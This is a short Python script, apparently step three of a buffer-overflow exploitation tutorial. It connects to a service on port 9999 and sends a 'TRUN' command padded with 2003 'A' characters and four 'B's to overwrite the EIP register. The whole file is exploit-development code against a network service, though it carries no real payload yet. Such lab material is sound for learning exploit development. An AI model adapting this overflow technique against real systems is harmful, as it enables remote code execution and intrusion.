#!/usr/bin/python3

# 3. Overwriting the EIP

import sys, socket

# Here 2003 is the offset value
shellcode = "A" * 2003 + "B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.1.0", 9999))
	payload = "TRUN /.:/ " + shellcode
	s.send((payload.encode()))
	s.close()
	
except:
	print("[-] Error connecting to server.")
	sys.exit()
